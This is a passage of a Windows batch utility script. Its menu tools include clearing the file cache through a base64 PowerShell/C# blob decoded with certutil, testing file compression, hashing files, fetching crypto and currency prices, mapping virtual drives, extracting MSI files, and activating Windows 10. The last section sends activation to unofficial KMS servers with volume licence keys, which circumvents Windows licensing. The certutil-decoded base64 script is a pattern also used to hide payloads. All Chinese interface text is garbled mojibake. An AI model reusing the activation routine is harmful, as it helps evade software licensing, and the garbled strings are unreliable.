echo IAAgACAAIAAgAGkAZgAgACgAIQBMAG8AbwBrAHUAcABQAHIAaQB2AGkAbABlAGcA
echo ZQBWAGEAbAB1AGUAKABuAHUAbABsACwAIABwAHIAaQB2AGkAbABlAGcAZQBOAGEA
echo bQBlACwAIAByAGUAZgAgAG4AZQB3AHMAdAAuAEwAdQBpAGQAKQApAA0ACgAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABoAHIAbwB3ACAA
echo bgBlAHcAIABFAHgAYwBlAHAAdABpAG8AbgAoACIARQByAHIAbwByACAAaQBuACAA
echo TABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlADoAIAAiACwA
echo IABuAGUAdwAgAFcAaQBuADMAMgBFAHgAYwBlAHAAdABpAG8AbgAoAE0AYQByAHMA
echo aABhAGwALgBHAGUAdABMAGEAcwB0AFcAaQBuADMAMgBFAHIAcgBvAHIAKAApACkA
echo KQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAA
echo bgB1AG0AIAA9ACAAQQBkAGoAdQBzAHQAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUA
echo ZwBlAHMAKABjAHUAcgByAGUAbgB0AC4AVABvAGsAZQBuACwAIABmAGEAbABzAGUA
echo LAAgAHIAZQBmACAAbgBlAHcAcwB0ACwAIAAwACwAIABJAG4AdABQAHQAcgAuAFoA
echo ZQByAG8ALAAgAEkAbgB0AFAAdAByAC4AWgBlAHIAbwApACAAPwAgADEAIAA6ACAA
echo MAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgA
echo bgB1AG0AIAA9AD0AIAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIABuAGUAdwAgAEUAeABjAGUAcAB0AGkA
echo bwBuACgAIgBFAHIAcgBvAHIAIABpAG4AIABBAGQAagB1AHMAdABUAG8AawBlAG4A
echo UAByAGkAdgBpAGwAZQBnAGUAcwA6ACAAIgAsACAAbgBlAHcAIABXAGkAbgAzADIA
echo RQB4AGMAZQBwAHQAaQBvAG4AKABNAGEAcgBzAGgAYQBsAC4ARwBlAHQATABhAHMA
echo dABXAGkAbgAzADIARQByAHIAbwByACgAKQApACkAOwANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAG4AdQBtACAAIQA9ACAA
echo MAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAA
echo IAAgACAAfQANAAoAIAAgACAAIAB9AA0ACgANAAoAIAAgACAAIABbAFMAdAByAHUA
echo YwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUA
echo ZQBuAHQAaQBhAGwALAAgAFAAYQBjAGsAIAA9ACAAMQApAF0ADQAKACAAIAAgACAA
echo cwB0AHIAdQBjAHQAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkATgBGAE8A
echo UgBNAEEAVABJAE8ATgANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAA
echo cAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAQwB1AHIAcgBlAG4AdABTAGkAegBlADsA
echo DQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABQAGUA
echo YQBrAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAA
echo dQBpAG4AdAAgAFAAYQBnAGUARgBhAHUAbAB0AEMAbwB1AG4AdAA7AA0ACgAgACAA
echo IAAgACAAIAAgACAAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAATQBpAG4AaQBtAHUA
echo bQBXAG8AcgBrAGkAbgBnAFMAZQB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUA
echo YgBsAGkAYwAgAHUAaQBuAHQAIABNAGEAeABpAG0AdQBtAFcAbwByAGsAaQBuAGcA
echo UwBlAHQAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4A
echo dAAgAFUAbgB1AHMAZQBkADEAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwA
echo aQBjACAAdQBpAG4AdAAgAFUAbgB1AHMAZQBkADIAOwANAAoAIAAgACAAIAAgACAA
echo IAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAFUAbgB1AHMAZQBkADMAOwANAAoA
echo IAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAFUAbgB1AHMA
echo ZQBkADQAOwANAAoAIAAgACAAIAB9AA0ACgANAAoAIAAgACAAIABbAFMAdAByAHUA
echo YwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUA
echo ZQBuAHQAaQBhAGwALAAgAFAAYQBjAGsAIAA9ACAAMQApAF0ADQAKACAAIAAgACAA
echo cwB0AHIAdQBjAHQAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkATgBGAE8A
echo UgBNAEEAVABJAE8ATgBfADYANABfAEIASQBUAA0ACgAgACAAIAAgAHsADQAKACAA
echo IAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcAIABDAHUAcgByAGUA
echo bgB0AFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAA
echo bABvAG4AZwAgAFAAZQBhAGsAUwBpAHoAZQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo cAB1AGIAbABpAGMAIABsAG8AbgBnACAAUABhAGcAZQBGAGEAdQBsAHQAQwBvAHUA
echo bgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcA
echo IABNAGkAbgBpAG0AdQBtAFcAbwByAGsAaQBuAGcAUwBlAHQAOwANAAoAIAAgACAA
echo IAAgACAAIAAgAHAAdQBiAGwAaQBjACAAbABvAG4AZwAgAE0AYQB4AGkAbQB1AG0A
echo VwBvAHIAawBpAG4AZwBTAGUAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIA
echo bABpAGMAIABsAG8AbgBnACAAVQBuAHUAcwBlAGQAMQA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAcAB1AGIAbABpAGMAIABsAG8AbgBnACAAVQBuAHUAcwBlAGQAMgA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABsAG8AbgBnACAAVQBuAHUA
echo cwBlAGQAMwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABsAG8A
echo bgBnACAAVQBuAHUAcwBlAGQANAA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAA
echo IAAgAFsAUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkA
echo bgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAAsACAAUABhAGMAawAgAD0AIAAxACkA
echo XQANAAoAIAAgACAAIABpAG4AdABlAHIAbgBhAGwAIABzAHQAcgB1AGMAdAAgAFQA
echo bwBrAFAAcgBpAHYAMQBMAHUAaQBkAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAA
echo IAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwBvAHUAbgB0ADsADQAKACAA
echo IAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGwAbwBuAGcAIABMAHUAaQBkADsA
echo DQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQA
echo cgA7AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKACIAQAANAAoADQAKAEEAZABkAC0A
echo VAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABTAG8A
echo dQByAGMAZQAgAC0ATABhAG4AZwB1AGEAZwBlACAAQwBTAGgAYQByAHAAIAANAAoA
echo DQAKAFsAQwBsAGUAYQByAFMAdABhAG4AZABiAHkATABpAHMAdAAuAFAAcgBvAGcA
echo cgBhAG0AXQA6ADoAQwBsAGUAYQByAEYAaQBsAGUAUwB5AHMAdABlAG0AQwBhAGMA
echo aABlACgAJAB0AHIAdQBlACkA
)>%temp%\base
certutil -decode -f "%temp%\base" %temp%\powershell.ps1>nul
net stop sysmain>nul 2>nul
if exist %temp%\listfile.log del/f/q %temp%\listfile.log
if exist %temp%\loadtime.log del/f/q %temp%\loadtime.log
if exist %temp%\uncompact.log del/f/q %temp%\uncompact.log
echo ��¼�ļ��б�...
for /f "delims=" %%a in ('"dir/a/s/b "%url%""') do (call :listfile "%%a" %%~za %%~xa)
echo ��ջ���...
call :powershell
echo ��¼�ļ�ѹ��ǰ�Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (call :loadfile %%a)
echo ѹ���ļ�...
for /f "tokens=*" %%a in (%temp%\listfile.log) do (compact /c %%a)
echo ��ջ���...
call :powershell
echo �Ƚ�ѹ��ǰ��Ķ�ȡʱ��...
for /f "tokens=*" %%a in (%temp%\loadtime.log) do (call :ifloadfile %%a)
echo ��ѹ���ʺ�ѹ�����ļ�...
for /f "tokens=*" %%a in (%temp%\uncompact.log) do (compact /u %%a)
net start sysmain>nul 2>nul
del/f/q %temp%\powershell.ps1
del/f/q %temp%\listfile.log
del/f/q %temp%\loadtime.log
del/f/q %temp%\uncompact.log
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:ifloadfile
set file=%1
set loadtime=%2
call :copyfile %file%
if 0x%sjc% geq 0x%loadtime% echo %file%>>%temp%\uncompact.log
goto :eof
:loadfile
set file=%1
call :copyfile %file%
echo %file% %sjc%>>%temp%\loadtime.log
goto :eof
:copyfile
set file=%1
set kssj=%time%
copy /z %file% nul
set jssj=%time%
call :sjc %kssj% %jssj%
echo ��ȡ��ʱ: %sjc:~4,2%.%sjc:~6,2%s
goto :eof
:listfile
set url=%1
set size=%2
set name=%3
dir/ad %url%>nul 2>nul&&goto :eof
if "%name%" equ ".zip" goto :eof
if "%name%" equ ".rar" goto :eof
if "%name%" equ ".7z" goto :eof
if "%name%" equ ".png" goto :eof
if "%name%" equ ".jpg" goto :eof
if "%name%" equ ".mp3" goto :eof
if "%name%" equ ".acc" goto :eof
if "%name%" equ ".m4a" goto :eof
if "%name%" equ ".flac" goto :eof
if "%name%" equ ".ape" goto :eof
if "%name%" equ ".mp4" goto :eof
if "%name%" equ ".avi" goto :eof
if "%name%" equ ".flv" goto :eof
if "%name%" equ ".f4v" goto :eof
if "%name%" equ ".mkv" goto :eof
if "%name%" equ ".3gp" goto :eof
if "%name%" equ ".cab" goto :eof
if "%name%" equ ".pdf" goto :eof
if %size% gtr 4096 if %size% leq 104857600 echo %url%>>%temp%\listfile.log
goto :eof
:66
title �����ļ���ϣֵ%system%
cls
set url=
set /p url=�����ļ�·��(e=���ز˵�):
if not defined url goto 66
if "%url:~0,1%%url:~-1%" neq """" for /f "delims=" %%a in ('"echo %url%"') do (set url="%%~a")
if /i !url! equ "e" goto memuv2 
if not exist "!url!" echo �ļ�������&timeout /t 2 /nobreak>nul&goto 66
dir /ad !url!>nul 2>nul&&echo ·�� !url! ����һ���ļ�&&timeout /t 2 /nobreak>nul&&goto 66
cls
echo �ļ�: 		%url%
for /f "delims=" %%a in ("!url!") do (
if %%~za gtr 1024 (
call :xdwjs %%~za b dw
echo;�ļ���С: 	!dw! %%~za�ֽ�
) else (
echo;�ļ���С: 	%%~za�ֽ�
)
)
call :hash %url% md5
echo;
echo MD5:	 %hash%
call :hash %url% sha1
echo SHA-1:	 %hash%
call :hash %url% sha256
echo SHA-256: %hash%
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:67
cls
title ��ʾ���һ���%system%
set mainurl=https://api.coincap.io/v2/assets/
set mainurl1=https://api.coincap.io/v2/rates/
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
echo ���ػ����ļ�(�ܹ�13���ļ�)...
set xzflag=::
set xzflag1=
if exist %systemroot%\system32\curl.exe (set xzflag1=::&set xzflag=)
%xzflag%pushd %temp%
%xzflag%curl !proxy! -A !ua! -# -Z -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o cny.json %mainurl1%chinese-yuan-renminbi -o doge.json %mainurl%dogecoin -o btc.json %mainurl%bitcoin -o eth.json %mainurl%ethereum -o au.json %mainurl1%gold-ounce -o ag.json %mainurl1%silver-ounce -o eur.json %mainurl1%euro -o gbp.json %mainurl1%british-pound-sterling -o jpy.json %mainurl1%japanese-yen -o hkd.json %mainurl1%hong-kong-dollar -o twd.json %mainurl1%new-taiwan-dollar -o xmr.json %mainurl%monero -o filecoin.json %mainurl%filecoin
%xzflag%popd
%xzflag1%bitsadmin /transfer ���ػ����ļ�... /priority FOREGROUND %mainurl1%chinese-yuan-renminbi %temp%\cny.json %mainurl%dogecoin %temp%\doge.json %mainurl%bitcoin %temp%\btc.json %mainurl%ethereum %temp%\eth.json %mainurl1%gold-ounce %temp%\au.json %mainurl1%silver-ounce %temp%\ag.json %mainurl1%euro %temp%\eur.json %mainurl1%british-pound-sterling %temp%\gbp.json %mainurl1%japanese-yen %temp%\jpy.json %mainurl1%hong-kong-dollar %temp%\hkd.json %mainurl1%new-taiwan-dollar %temp%\twd.json %mainurl%monero %temp%\xmr.json %mainurl%filecoin %temp%\filecoin.json
cls
echo ��������ļ�...
for /f "delims=:} tokens=7" %%a in (%temp%\cny.json) do (set cnytousd=%%a)
if not defined cnytousd set cnytousd=1
set cnytousd=%cnytousd:"=%
for /f "delims=:, tokens=19,21" %%a in (%temp%\doge.json) do (set dogetousd=%%a&&set doge24h=%%b)
if not defined dogetousd set dogetousd=1&&set doge24h=0
set dogetousd=%dogetousd:"=%
set doge24h=%doge24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %doge24h%"') do (set doge24h1=%%a&&set doge24h2=%%b)
set doge24h=%doge24h1%.%doge24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\btc.json) do (set btctousd=%%a&&set btc24h=%%b)
if not defined btctousd set btctousd=1&&set btc24h=0
set btctousd=%btctousd:"=%
set btc24h=%btc24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %btc24h%"') do (set btc24h1=%%a&&set btc24h2=%%b)
set btc24h=%btc24h1%.%btc24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\eth.json) do (set ethtousd=%%a&&set eth24h=%%b)
if not defined ethtousd set ethtousd=1&&set eth24h=0
set ethtousd=%ethtousd:"=%
set eth24h=%eth24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %eth24h%"') do (set eth24h1=%%a&&set eth24h2=%%b)
set eth24h=%eth24h1%.%eth24h2:~0,3%
for /f "delims=:, tokens=19,21" %%a in (%temp%\filecoin.json) do (set filetousd=%%a&&set file24h=%%b)
if not defined filetousd set filetousd=1&&file24h=0
set filetousd=%filetousd:"=%
set file24h=%file24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo;%file24h%"') do (set file24h1=%%a&&set file24h2=%%b)
set file24h=%file24h1%.%file24h2:~0,3%
for /f "delims=:} tokens=7" %%a in (%temp%\au.json) do (set autousd=%%a)
if not defined autousd set autousd=1
set autousd=%autousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\ag.json) do (set agtousd=%%a)
if not defined agtousd set agtousd=1
set agtousd=%agtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\eur.json) do (set eurtousd=%%a)
if not defined eurtousd set eurtousd=1
set eurtousd=%eurtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\gbp.json) do (set gbptousd=%%a)
if not defined gbptousd set gbptousd=1
set gbptousd=%gbptousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\jpy.json) do (set jpytousd=%%a)
if not defined jpytousd set jpytousd=1
set jpytousd=%jpytousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\hkd.json) do (set hkdtousd=%%a)
if not defined hkdtousd set hkdtousd=1
set hkdtousd=%hkdtousd:"=%
for /f "delims=:} tokens=7" %%a in (%temp%\twd.json) do (set twdtousd=%%a)
if not defined twdtousd set twdtousd=1
set hkdtousd=%hkdtousd:"=%
for /f "delims=:, tokens=19,21" %%a in (%temp%\xmr.json) do (set xmrtousd=%%a&&set xmr24h=%%b)
if not defined xmrtousd set xmrtousd=1&&set xmr24h=0
set xmrtousd=%xmrtousd:"=%
set xmr24h=%xmr24h:"=%
for /f "delims=. tokens=1,2" %%a in ('"echo %xmr24h%"') do (set xmr24h1=%%a&&set xmr24h2=%%b)
set xmr24h=%xmr24h1%.%xmr24h2:~0,3%
call :Division %dogetousd% %cnytousd% 8 dogetocny
call :Division %btctousd% %cnytousd% 8 btctocny
call :Division %ethtousd% %cnytousd% 8 ethtocny
call :Division %eurtousd% %cnytousd% 8 eurtocny
call :Division %gbptousd% %cnytousd% 8 gbptocny
call :Division %jpytousd% %cnytousd% 8 jpytocny
call :Division %hkdtousd% %cnytousd% 8 hkdtocny
call :Division %twdtousd% %cnytousd% 8 twdtocny
call :Division %xmrtousd% %cnytousd% 8 xmrtocny
call :Division %filetousd% %cnytousd% 8 filetocny
call :Division 1 %cnytousd% 3 usdtocny
call :Division %autousd% 31.1034768 3 autocny
call :Division %agtousd% 31.1034768 3 agtocny
call :xcf !autocny! !usdtocny! autocny
call :xcf !agtocny! !usdtocny! agtocny
rem for /f "delims=" %%a in ('"powershell %dogetousd%/%cnytousd%"') do (set dogetocny=%%a)
rem for /f "delims=" %%a in ('"powershell %btctousd%/%cnytousd%"') do (set btctocny=%%a)
rem for /f "delims=" %%a in ('"powershell %ethtousd%/%cnytousd%"') do (set ethtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %eurtousd%/%cnytousd%"') do (set eurtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %gbptousd%/%cnytousd%"') do (set gbptocny=%%a)
rem for /f "delims=" %%a in ('"powershell %jpytousd%/%cnytousd%"') do (set jpytocny=%%a)
rem for /f "delims=" %%a in ('"powershell %hkdtousd%/%cnytousd%"') do (set hkdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %twdtousd%/%cnytousd%"') do (set twdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %xmrtousd%/%cnytousd%"') do (set xmrtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %filetousd%/%cnytousd%"') do (set filetocny=%%a)
rem for /f "delims=" %%a in ('"powershell 1/%cnytousd%"') do (set usdtocny=%%a)
rem for /f "delims=" %%a in ('"powershell %autousd%/31.1034768*%usdtocny%"') do (set autocny=%%a)
rem for /f "delims=" %%a in ('"powershell %agtousd%/31.1034768*%usdtocny%"') do (set agtocny=%%a)
cls
echo �ƽ�XAU    �� �����CNY
echo 	1  �� !autocny!
echo;
echo ����XAG    �� �����CNY
echo 	1  �� !agtocny!
echo;
echo ��̫��ETH  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !ethtocny!		24Сʱ�ǵ���: <nul
if "!eth24h:~0,1!" equ "-" (call :colortxt a !eth24h!) else (call :colortxt c +!eth24h!)
set /p =%% <nul
echo;
echo;
echo ���ر�BTC  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !btctocny!		24Сʱ�ǵ���: <nul
if "!btc24h:~0,1!" equ "-" (call :colortxt a !btc24h!) else (call :colortxt c +!btc24h!)
set /p =%% <nul
echo;
echo;
echo ���ޱ�XMR  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !xmrtocny!		24Сʱ�ǵ���: <nul
if "!xmr24h:~0,1!" equ "-" (call :colortxt a !xmr24h!) else (call :colortxt c +!xmr24h!)
set /p =%% <nul
echo;
echo;
echo;�ļ���FILE �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !filetocny!		24Сʱ�ǵ���: <nul
if "!file24h:~0,1!" equ "-" (call :colortxt a !file24h!) else (call :colortxt c +!file24h!)
set /p =%% <nul
echo;
echo;
echo ������DOGE �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !dogetocny!			24Сʱ�ǵ���: <nul
if "!doge24h:~0,1!" equ "-" (call :colortxt a !doge24h!) else (call :colortxt c +!doge24h!)
set /p =%% <nul
echo;
echo;
echo ��ԪUSD    �� �����CNY
echo 	1  �� !usdtocny!
echo;
echo ŷԪEUR    �� �����CNY
echo 	1  �� !eurtocny!
echo;
echo Ӣ��GBP    �� �����CNY
echo 	1  �� !gbptocny!
echo;
echo ��ԪJPY    �� �����CNY
echo 	1  �� !jpytocny!
echo;
echo �۱�HKD    �� �����CNY
echo 	1  �� !hkdtocny!
echo;
echo ��̨��TWD  �� �����CNY
echo 	1  �� !twdtocny!
echo _______________________________________________________________________________
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:68
cls
title ���������̷�%system%
echo [1]��·�����̷�����
echo [2]ɾ�������̷�
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 68(1)
if "%errorlevel%" equ "2" goto 68(2)
if "%errorlevel%" equ "3" goto memuv2
goto memuv2
:68(1)
title ��·�����̷�����%system%
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
echo ��ǰ�����̷�: %sypf%
echo �����̷�:
for /f "delims=" %%a in ('"subst"') do (echo %%a)
echo _______________________________________________________________________________
set newpf=
set /p newpf=����Ҫ���������̷�:
if not defined newpf goto 68
set newpf|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" echo ��Ч����&timeout /t 2 /nobreak>nul&goto 68(1)
set gllj=
set /p gllj=����Ҫ������·��:
if not defined gllj goto 68
set gllj="%gllj:|=%"
if "%gllj:~0,1%%gllj:~-1%" neq """" for /f "delims=" %%a in ('"echo %gllj%"') do (set %gllj%="%%~a")
if /i !gglj! equ "" goto memuv2 
if not exist "!gllj!" echo ·��������&timeout /t 2 /nobreak>nul&goto 68(1)
dir /ad !gllj!>nul 2>nul||echo ·�� !gllj! ����һ���ļ���&&timeout /t 2 /nobreak>nul&&goto 68(1)
subst %newpf%: %gllj%
if "%errorlevel%" equ "0" (echo �����ɹ�&timeout /t 2 /nobreak>nul&goto 68) else (echo ����ʧ��&timeout /t 2 /nobreak>nul&goto 68)
:68(2)
title ɾ�������̷�%system%
cls
echo �����̷�:
for /f "delims=" %%a in ('"subst"') do (echo %%a)
echo _______________________________________________________________________________
set xzxnp=
set /p xzxnp=����Ҫж�ص��̷�:
if not defined xzxnp goto 68
set xzxnp|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" echo ��Ч����&timeout /t 2 /nobreak>nul&goto 68(2)
subst %xzxnp%: /d
if "%errorlevel%" equ "0" (echo ж�سɹ�&timeout /t 2 /nobreak>nul&goto 68) else (echo ж��ʧ��&timeout /t 2 /nobreak>nul&goto 68)
:69
title ��ѹmsi��װ�ļ�%system%
cls
set msiurl=
set /p msiurl=����msi�ļ�·��(e=���ز˵�):
if not defined msiurl goto memuv2
if "%msiurl:~0,1%%msiurl:~-1%" neq """" for /f "delims=" %%a in ('"echo %msiurl%"') do (set msiurl="%%~a")
if /i !msiurl! equ "e" goto memuv2
if not exist "!msiurl!" echo �ļ�������&timeout /t 2 /nobreak>nul&goto memuv2
dir /ad !msiurl!>nul 2>nul&&echo ·�� !msiurl! ����һ���ļ�&&timeout /t 2 /nobreak>nul&&goto memuv2
for /f "delims=" %%a in ('"echo !msiurl!"') do (if /i "%%~xa" neq ".msi" echo ����msi�ļ�&&timeout /t 2 /nobreak>nul&&goto memuv2)
set msidir=
set /p msidir=����msi�ļ���ѹ·��(Ĭ��·��Ϊmsi�ļ�����·��)(e=���ز˵�):
if not defined msidir for /f "delims=" %%a in ('"echo !msiurl!"') do (set msidir="%%~dpna")
if "%msidir:~0,1%%msidir:~-1%" neq """" for /f "delims=" %%a in ('"echo %msidir%"') do (set msidir="%%~a")
if /i !msidir! equ "e" goto memuv2
echo ��ʼ��ѹ...
if not exist "!msidir!" (msiexec /a !msiurl! /quiet /passive /qn targetdir=!msidir!) else (echo ���ܽ�ѹ���Ѵ��ڵ��ļ���&&timeout /t 2 /nobreak>nul)
rd /s /q %systemdriver%\config.msi>nul 2>nul
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:70
title ����CMD����̨ɫ�ʱ�%system%
cls
color 07
set cs=0
for /l %%a in (40,1,47) do (for /l %%b in (90,1,97) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !xh1! equ 40 set bj=0
if !xh1! equ 41 set bj=4
if !xh1! equ 42 set bj=2
if !xh1! equ 43 set bj=6
if !xh1! equ 44 set bj=1
if !xh1! equ 45 set bj=5
if !xh1! equ 46 set bj=3
if !xh1! equ 47 set bj=7
if !xh2! equ 90 set zt=8
if !xh2! equ 91 set zt=c
if !xh2! equ 92 set zt=a
if !xh2! equ 93 set zt=e
if !xh2! equ 94 set zt=9
if !xh2! equ 95 set zt=d
if !xh2! equ 96 set zt=b
if !xh2! equ 97 set zt=f
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m&set cs=0)))
set cs=0
for /l %%a in (40,1,47) do (for /l %%b in (90,1,97) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m&set cs=0)))
for /l %%a in (90,1,97) do (for /l %%b in (40,1,47) do (
if %%a lss 10 (set xh1=0%%a) else (set xh1=%%a)
if %%b lss 10 (set xh2=0%%b) else (set xh2=%%b)
if !cs! lss 7 (set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul&set /a cs=!cs!+1) else (echo !cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m&set cs=0)))
set /p =!cswz!s!cswz!27;0H<nul
for /l %%b in (1,1,4) do (
echo;
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;255;0;%%am !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;255;%%a;0m !cswz!0m<nul)
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;%%a;255;0m !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;0;255;%%am !cswz!0m<nul)
for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;0;%%a;255m !cswz!0m<nul)
for /l %%a in (0,13,255) do (set /p =!cswz!48;2;%%a;0;255m !cswz!0m<nul))
set /p =!cswz!u<nul
echo _______________________________________________________________________________
set /p =����������ز˵�<nul&pause>nul
goto memuv2
:71
title KMS����Windows 10%system%
cls
set Core=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
set CoreCountrySpecific=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR
set CoreN=3KHY7-WNT83-DGQKR-F7HPR-844BM
set CoreSingleLanguage=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH
set ProfessionalStudent=YNXW3-HV3VB-Y83VG-KPBXM-6VH3Q
set ProfessionalStudentN=8G9XJ-GN6PJ-GW787-MVV7G-GMR99
set Professional=W269N-WFGWX-YVC9B-4J6C9-T83GX
set ProfessionalN=MH37W-N47XK-V7XM9-C7227-GCQG9
set ProfessionalSN=8Q36Y-N2F39-HRMHT-4XW33-TCQR4
set ProfessionalWMC=NKPM6-TCVPT-3HRFX-Q4H9B-QJ34Y
set Enterprise=NPPR9-FWDCX-D2C8J-H872K-2YT43
set EnterpriseN=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4
set Education=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
set EducationN=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ
set EnterpriseS=WNMTR-4C88C-JK8YV-HQ7T2-76DF9
set EnterpriseSN=2F77B-TNFGY-69QQF-B8YKP-D69TJ
for /f "tokens=3 delims= " %%a in ('reg QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "EditionID"') do set sysid=%%a
set server=
if defined !sysid! (echo ϵͳ����: %system:~3%) else (call :colortxt c û�е�ǰϵͳ�ļ�����Կ&echo;)
ping /n 1 www.baidu.com>nul||call :colortxt c û����������&echo;
echo ��ѡ��KMS������
echo _______________________________________________________________________________
echo [1]kms.loli.best
echo [2]kms.03k.org
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 120 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" set server=kms.loli.best&goto 71.1
if "%errorlevel%" equ "2" set server=kms.03k.org&goto 71.1
